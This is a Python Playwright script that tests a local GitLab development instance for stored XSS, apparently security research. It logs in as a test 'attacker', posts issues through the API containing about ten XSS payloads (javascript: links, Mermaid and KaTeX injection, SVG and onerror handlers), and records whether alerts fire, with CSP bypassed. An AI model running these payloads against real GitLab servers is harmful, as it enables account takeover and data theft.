"""
Playwright XSS verification v2 - with robust navigation handling
"""
import json
import os
import time
from playwright.sync_api import sync_playwright

GDK = "http://127.0.0.1:3000"
RESULTS = []
EVIDENCE_DIR = "./evidence"


def log(msg):
    print(f"[*] {msg}")


def record_result(name, vuln, details):
    status = "VULNERABLE" if vuln else "SAFE"
    RESULTS.append({"name": name, "status": status, "details": details})
    marker = "!!!" if vuln else "   "
    print(f"  {marker} [{status}] {name}: {details}")


def login(page):
    log("Logging in as attacker...")
    page.goto(f"{GDK}/users/sign_in", wait_until="domcontentloaded")
    page.wait_for_timeout(2000)
    page.fill('input[name="user[login]"]', "attacker")
    page.fill('input[name="user[password]"]', "Password123!")
    page.click('input[type="submit"], button[type="submit"]')
    page.wait_for_timeout(3000)
    log(f"Logged in. URL: {page.url}")


def test_issue(page, iid, test_name, wait_ms=6000):
    """Test a single issue for XSS."""
    alerts = []

    def handle_dialog(dialog):
        alerts.append(dialog.message)
        log(f"  ALERT TRIGGERED: {dialog.message}")
        dialog.dismiss()

    page.on("dialog", handle_dialog)

    url = f"{GDK}/attacker/xss-test/-/issues/{iid}"
    log(f"Testing {test_name} (issue #{iid})...")

    try:
        page.goto(url, wait_until="domcontentloaded")
        page.wait_for_timeout(wait_ms)

        # Take screenshot
        page.screenshot(path=f"{EVIDENCE_DIR}/xss-issue-{iid}.png")

        # Check DOM for dangerous elements
        dom = page.evaluate("""() => {
            const body = document.body.innerHTML;
            return {
                js_hrefs: Array.from(document.querySelectorAll('a[href^="javascript:"]')).map(a => ({html: a.outerHTML, href: a.href})),
                event_els: Array.from(document.querySelectorAll('[onload],[onerror],[onclick],[onmouseover],[ontoggle],[onfocus]')).map(e => e.outerHTML.substring(0, 200)),
                mermaid_svgs: document.querySelectorAll('.mermaid svg, svg.mermaid').length,
                mermaid_rendered: document.querySelectorAll('[data-mermaid-style]').length,
                katex_els: document.querySelectorAll('.katex, .katex-html').length,
                has_js_in_body: body.includes('javascript:alert'),
                has_onerror_attr: /onerror\\s*=/.test(body),
                has_onload_attr: /onload\\s*=/.test(body),
            };
        }""")

        vuln = bool(alerts)
        details = []

        if alerts:
            details.append(f"ALERT FIRED: {alerts}")
        if dom.get("js_hrefs"):
            vuln = True
            details.append(f"javascript: hrefs: {dom['js_hrefs'][:3]}")
        if dom.get("event_els"):
            vuln = True
            details.append(f"Event handler elements: {dom['event_els'][:3]}")
        if not details:
            info = []
            if dom.get("mermaid_svgs"):
                info.append(f"mermaid_svgs={dom['mermaid_svgs']}")
            if dom.get("katex_els"):
                info.append(f"katex_els={dom['katex_els']}")
            info.append(f"js_in_body={dom.get('has_js_in_body')}")
            info.append(f"onerror_attr={dom.get('has_onerror_attr')}")
            details.append(", ".join(info))

        record_result(test_name, vuln, "; ".join(details))

    except Exception as e:
        record_result(test_name, False, f"Error: {e}")

    page.remove_listener("dialog", handle_dialog)
    return bool(alerts)


def create_issue(page, title, description):
    """Create a test issue via API."""
    result = page.evaluate(f"""async () => {{
        const resp = await fetch('{GDK}/api/v4/projects/21/issues', {{
            method: 'POST',
            headers: {{
                'PRIVATE-TOKEN': 'glpat-attacker-token-00001',
                'Content-Type': 'application/json'
            }},
            body: JSON.stringify({{title: {json.dumps(title)}, description: {json.dumps(description)}}})
        }});
        const data = await resp.json();
        return data.iid || null;
    }}""")
    if result:
        log(f"  Created issue #{result}: {title}")
    return result


def main():
    with sync_playwright() as p:
        browser = p.chromium.launch(
            headless=True,
            args=["--disable-web-security", "--no-sandbox"]  # Allow us to detect XSS even with CSP
        )
        context = browser.new_context(
            record_video_dir=EVIDENCE_DIR,
            record_video_size={"width": 1280, "height": 720},
            viewport={"width": 1280, "height": 720},
            bypass_csp=True,  # Bypass CSP to detect if payloads execute without CSP
        )
        page = context.new_page()
        login(page)

        log("\n=== PHASE 1: TEST EXISTING ISSUES ===\n")

        existing = [
            (16, "Markdown javascript: link"),
            (17, "Data URI in img"),
            (18, "div onmouseover"),
            (19, "iframe javascript:"),
            (20, "KaTeX \\href javascript:"),
            (21, "Mermaid onerror"),
            (22, "SVG onload"),
            (23, "details ontoggle"),
        ]

        for iid, name in existing:
            test_issue(page, iid, name, wait_ms=8000)

        log("\n=== PHASE 2: CREATE & TEST ADDITIONAL VECTORS ===\n")

        additional = [
            ("Mermaid click callback", '```mermaid\ngraph TD\n    A["Click me"]\n    click A callback "javascript:alert(document.domain)"\n```'),
            ("Mermaid securityLevel none", '```mermaid\n%%{init: {"securityLevel": "loose"}}%%\ngraph TD\n    A["<img src=x onerror=alert(1)>"]\n```'),
            ("KaTeX \\url", '$$\\url{javascript:alert(1)}$$\n\n$`\\href{javascript:alert(document.domain)}{Click Me}`$'),
            ("HTML entity encoded", '<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">click</a>'),
            ("Markdown title injection", '![x](https://example.com "onmouseover=alert(1)")'),
            ("CSS import XSS", '<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(1)">test</div>'),
            ("Math block \\class", '```math\n\\class{foo}{\\text{\\langle img src=x onerror=alert(1)\\rangle}}\n```'),
            ("Nested markdown", '> <details><summary>Click</summary><img src=x onerror=alert(1)></details>'),
            ("SVG foreignObject", '<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror=alert(1)></body></foreignObject></svg>'),
            ("Form action XSS", '<form action="javascript:alert(1)"><button>Submit</button></form>'),
        ]

        for title, desc in additional:
            iid = create_issue(page, f"XSS: {title}", desc)
            if iid:
                test_issue(page, iid, title, wait_ms=8000)

        # Summary
        log("\n" + "=" * 60)
        log("FINAL RESULTS")
        log("=" * 60)

        vulns = [r for r in RESULTS if r["status"] == "VULNERABLE"]
        safe = [r for r in RESULTS if r["status"] == "SAFE"]

        if vulns:
            log(f"\n{'!'*20} VULNERABILITIES FOUND {'!'*20}")
            for v in vulns:
                log(f"  !!! {v['name']}: {v['details']}")
        else:
            log("\n  No XSS executions detected (even with CSP bypassed)")

        log(f"\nTotal tested: {len(RESULTS)}")
        log(f"Vulnerable: {len(vulns)}")
        log(f"Safe: {len(safe)}")

        # Save results
        with open(f"{EVIDENCE_DIR}/xss-results.json", "w") as f:
            json.dump(RESULTS, f, indent=2)

        context.close()
        browser.close()

        log(f"\nScreenshots and video saved to {EVIDENCE_DIR}/")


if __name__ == "__main__":
    main()
